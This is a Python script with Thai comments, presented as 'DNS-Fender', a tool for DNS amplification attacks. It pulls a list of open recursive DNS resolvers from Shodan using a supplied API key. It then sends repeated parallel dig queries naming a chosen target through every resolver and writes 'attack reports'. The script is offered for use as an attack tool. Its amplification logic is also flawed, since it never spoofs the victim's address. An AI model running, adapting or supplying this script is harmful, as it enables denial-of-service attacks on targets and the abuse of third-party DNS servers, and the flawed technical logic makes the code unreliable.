import os
import time
import subprocess
from multiprocessing import Pool
import argparse

RED = '\033[01;31m'

# ฟังก์ชันสำหรับรับอาร์กิวเมนต์จาก command line
def get_args():
    parser = argparse.ArgumentParser(description="DNS-Fender: A tool for DNS Amplification attacks using Shodan.")
    parser.add_argument("-k", "--api_key", type=str, help="Shodan API key", required=True)
    parser.add_argument("-t", "--target", type=str, help="Target IP or Website", required=True)
    return parser.parse_args()

# ฟังก์ชันสำหรับแสดง banner
def banner():
    print("*******************************")
    print("*      DNS-Fender Tool        *")
    print("*******************************")

# ฟังก์ชันสำหรับทำความสะอาดหลังจากการโจมตี
def cleanup():
    try:
        os.remove("DNS-Resolvers.txt")
    except FileNotFoundError:
        pass

# ฟังก์ชันสำหรับเริ่มต้นใช้ Shodan
def initialize_shodan(api_key, shodan_path):
    # เรียกใช้คำสั่ง shodan init เพื่อเริ่มต้นใช้ Shodan โดยให้ API key
    result = subprocess.run([shodan_path, "init", api_key], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)

# ฟังก์ชันสำหรับดาวน์โหลด DNS Resolvers จาก Shodan
def download_dns_resolvers(shodan_path):
    # ใช้คำสั่ง shodan download เพื่อดาวน์โหลดข้อมูล DNS Resolvers จาก Shodan
    subprocess.run([shodan_path, "download", "DNS-Resolvers", "Recursion: enabled"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)

# ฟังก์ชันสำหรับแปลง JSON และลบไฟล์ JSON
def parse_and_remove_json(shodan_path):
    # ใช้คำสั่ง shodan parse เพื่อแปลงไฟล์ JSON ที่ดาวน์โหลดมา
    result = subprocess.run([shodan_path, "parse", "--fields", "ip_str", "DNS-Resolvers.json.gz"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

    # ลบไฟล์ JSON
    try:
        os.remove("DNS-Resolvers.json.gz")
    except FileNotFoundError:
        pass

    # เขียนผลลัพธ์ลงในไฟล์ DNS-Resolvers.txt
    with open("DNS-Resolvers.txt", "w") as file:
        file.write(result.stdout)

# ฟังก์ชันสำหรับโจมตีด้วย DNS Amplification
def issue_dns_amplification_attack(args):
    target, resolver_ip = args
    # ใช้คำสั่ง dig เพื่อโจมตี Target IP/Website ด้วย DNS Amplification
    result = subprocess.run(["dig", target, f"@{resolver_ip}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # รายงานการโจมตีละเอียดเพิ่มเติม
    with open("detailed_attack_report.txt", "a") as report_file:
        report_file.write(f"Resolver IP: {resolver_ip}\n")
        report_file.write(f"Query for {target}:\n")
        report_file.write(result.stdout)
        report_file.write("\n" + "=" * 50 + "\n\n")

# ฟังก์ชันสำหรับเขียนรายงานการโจมตีทั้งหมด
def write_attack_reports(target, filename="attack_report.txt"):
    with open(filename, "a") as file:
        file.write(f"Attack on {target} completed at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

# ฟังก์ชันสำหรับเขียนรายงานการโจมตีละเอียดเพิ่มเติม
def write_detailed_report(target, resolver_ips, num_attacks=3, num_processes=5):
    args = [(target, resolver_ip) for resolver_ip in resolver_ips]

    # วนลูปทำการโจมตีตามจำนวนที่กำหนด
    for i in range(num_attacks):
        with Pool(processes=num_processes) as pool:
            pool.map(issue_dns_amplification_attack, args)
            time.sleep(2)  # พัก 2 วินาทีระหว่างการโจมตี

# ฟังก์ชันหลัก
def main():
    try:
        banner()
        args = get_args()
        api_key = args.api_key
        target = args.target
        shodan_path = r"C:\Users\patrickz\AppData\Roaming\Python\Python311\Scripts\shodan"

        # เริ่มต้นใช้ Shodan
        initialize_shodan(api_key, shodan_path)

        # ดาวน์โหลด DNS Resolvers จาก Shodan
        download_dns_resolvers(shodan_path)

        # แปลง JSON และลบไฟล์ JSON
        parse_and_remove_json(shodan_path)

        print("#####                     (31%)")
        time.sleep(4)

        # อ่าน IP จากไฟล์และทำการโจมตีด้วย DNS Amplification
        with open("DNS-Resolvers.txt", "r") as file:
            resolver_ips = [line.strip() for line in file]

        write_detailed_report(target, resolver_ips)

        print("#############             (62%)")
        time.sleep(5)
        print("#######################   (100%)")
        print("Attack complete")

        # เขียนรายงานการโจมตีทั้งหมด
        write_attack_reports(target)

    finally:
        # ทำความสะอาดหลังจากการโจมตี
        cleanup()

if __name__ == "__main__":
    main()
